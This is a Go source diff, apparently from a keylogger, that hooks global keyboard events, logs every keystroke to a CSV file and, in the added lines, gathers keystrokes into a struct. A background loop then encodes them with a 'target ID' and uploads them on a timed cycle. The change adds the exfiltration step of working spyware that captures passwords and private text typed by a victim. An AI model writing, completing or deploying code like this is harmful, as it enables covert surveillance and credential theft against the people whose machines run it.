@@ -61,6 +61,9 @@ func main() {
 	var csvFileName = getNewCSVFileName()
 	var file *os.File = nil
 	var writer *csv.Writer = nil
+	var keys KeyboardDataStruct = KeyboardDataStruct{
+		Contents: []string{},
+	}
 
 	// implement graceful exit
 	cleanupOnSigterm(file, writer)
@@ -117,6 +120,7 @@ func main() {
 					value = string(rune(event.Keychar))
 				}
 
+				writeToLocalStruct(event, value, &keys)
 				writeDataToDisk(event, value, writer)
 			} else if event.Kind == hook.KeyUp {
 				// TODO: implement this later(?)
@@ -127,9 +131,24 @@ func main() {
 				// get `value` from the rawcode map
 				value, ok := RAWCODE_MAP[event.Rawcode]
 				if ok {
+					writeToLocalStruct(event, value, &keys)
 					writeDataToDisk(event, value, writer)
 				}
 			}
+		}
+	})
+
+	go recoverer(-1, 3, func() {
+		for {
+			// encode data
+			encodedData := encodeUploadData(keys, getTargetID())
+			// upload data
+			uploadData(encodedData)
+			// reset `key.Contents`
+			keys.Contents = []string{}
+
+			// upload data every `<CYCLE_TIME>`
+			time.Sleep(CYCLE_TIME)
 		}
 	})
 
